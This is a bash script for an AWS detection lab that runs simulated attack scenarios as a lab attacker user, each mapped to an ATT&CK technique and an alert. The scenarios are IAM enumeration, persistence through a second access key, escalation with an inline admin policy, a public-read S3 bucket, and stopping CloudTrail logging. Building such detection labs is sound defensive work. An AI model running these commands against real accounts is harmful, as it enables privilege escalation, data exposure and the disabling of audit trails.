#!/usr/bin/env bash
# Runs attack scenarios as the lab attacker user. Each step maps to a detection.
# Safe: all actions are inside your own lab account and undone by 'terraform destroy'.
set -uo pipefail

PROFILE="${PROFILE:-detlab-attacker}"
ATTACKER_USER="${ATTACKER_USER:-detlab-attacker}"
AWS="aws --profile $PROFILE"

pause() { echo; read -rp "  -- press Enter for next scenario --"; echo; }

echo "=== Scenario 1: account enumeration (GuardDuty Recon:IAMUser, ATT&CK T1087) ==="
$AWS iam list-users --max-items 50 >/dev/null && echo "  list-users ok"
$AWS iam list-roles --max-items 50 >/dev/null && echo "  list-roles ok"
$AWS iam get-account-authorization-details >/dev/null && echo "  get-account-authorization-details ok"
pause

echo "=== Scenario 2: persistence via second access key (detection #5, T1098.001) ==="
$AWS iam create-access-key --user-name "$ATTACKER_USER" \
  --query 'AccessKey.AccessKeyId' --output text
pause

echo "=== Scenario 3: privilege escalation, inline admin policy (detection #4, T1098) ==="
$AWS iam put-user-policy --user-name "$ATTACKER_USER" \
  --policy-name escalate \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  && echo "  inline admin policy attached"
pause

echo "=== Scenario 4: public S3 bucket policy (detection #6, T1530 / T1567.002) ==="
BUCKET="detlab-exfil-$RANDOM$RANDOM"
$AWS s3api create-bucket --bucket "$BUCKET" --region "${AWS_REGION:-us-east-1}" && echo "  created $BUCKET"
$AWS s3api put-public-access-block --bucket "$BUCKET" \
  --public-access-block-configuration BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false
$AWS s3api put-bucket-policy --bucket "$BUCKET" --policy "{
  \"Version\":\"2012-10-17\",
  \"Statement\":[{\"Sid\":\"public\",\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":\"s3:GetObject\",\"Resource\":\"arn:aws:s3:::$BUCKET/*\"}]
}" && echo "  public-read policy set on $BUCKET"
echo "  (remember this bucket name for teardown: $BUCKET)"
pause

echo "=== Scenario 5: impair defenses, stop CloudTrail (detection #3, T1562.008) ==="
TRAIL=$($AWS cloudtrail describe-trails --query 'trailList[?contains(Name, `detlab`)].Name | [0]' --output text)
if [ "$TRAIL" != "None" ] && [ -n "$TRAIL" ]; then
  $AWS cloudtrail stop-logging --name "$TRAIL" && echo "  stopped logging on $TRAIL"
  echo "  re-enabling so the rest of the lab keeps recording ..."
  aws cloudtrail start-logging --name "$TRAIL"   # admin creds re-enable
else
  echo "  could not resolve trail name, skipping"
fi

echo
echo "Done. Check your email and the CloudWatch Alarms console over the next 1-5 min."
echo "GuardDuty findings may take 15 min to a few hours. Log everything in FINDINGS.md."
